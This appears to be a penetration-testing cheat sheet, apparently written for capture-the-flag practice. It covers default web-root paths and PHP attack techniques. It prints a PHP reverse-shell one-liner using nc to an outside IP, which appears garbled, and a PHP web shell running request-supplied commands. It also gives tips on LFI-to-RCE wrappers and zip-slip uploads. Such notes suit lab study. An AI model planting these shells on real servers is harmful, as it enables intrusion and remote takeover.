# Web Servers & Web Attacks

{% hint style="info" %}
Never forget to check your web request headers
{% endhint %}

## Apache

Find out which OS it's running on first from nmap scan

```
Root: /var/www
for multiple vhosts root is /var/www/[site1] and goes on
Vhost config: /etc/apache2/sites-enabled/000-default.conf
.htaccess and .htpasswd are at root of server
```

{% embed url="https://cwiki.apache.org/confluence/display/httpd/DistrosDefaultLayout#DistrosDefaultLayout-Apachehttpd2.4defaultlayout(apache.orgsourcepackage):" %}

## Nginx

{% embed url="https://www.howtogeek.com/devops/how-to-find-your-nginx-configuration-folder/" %}

## Windows

### XAMPP

`C:\xampp\htdocs`

### Inetpub

.aspx reverse shells are lethal here

`C:\inetpub\wwwroot`

## PHP

{% code title="Lethal one-liners" %}
```php
"<?php system('rm /tmp/f;mkfifo /tm&1|nc 192.168.49.51 8001>/tmp/f'); ?>"
<?php system($_REQUEST['cmd']); ?>
```
{% endcode %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md" %}

Try to use PoC exploit (phpinfo) first before attempting reverse shell, this will also provide a lot of info

```
<?php phpinfo(); ?>
```

{% hint style="info" %}
HTB UpDown \[Linux]
{% endhint %}

**'include()' indicates code execution, 'file\_get\_contents()' indicates LFI**

If eval() is present in php file, then no need for PHP tags

```
system("dir C:\\");
```

{% embed url="https://github.com/teambi0s/dfunc-bypasser" %}

To find disabled functions on PHP website

`python2 dfunc-bypasser.py --url [path to phpinfo page]`

Wrappers to look out for:

* filter (view source)
* phar (LFI2RCE)
* zip (LFI2RCE)

If there is an input field where it fetches a file and you control that parameter, you can view the source of PHP file itself or the Apache log for LFI2RCE

#### Zipslip

If application is unzipping your zip file upload, we could potentially upload a reverse shell but knowing the web root structure is important otherwise we won't know where extract file is located.

{% embed url="https://infosecwriteups.com/zip-slip-vulnerability-064d46ca42e5" %}

#### Filter Chains

{% embed url="https://github.com/synacktiv/php_filter_chain_generator" %}

{% embed url="https://exploit-notes.hdks.org/exploit/web/php-filters-chain/" %}

{% hint style="info" %}
Watch PHP deserialization
{% endhint %}

{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html" %}
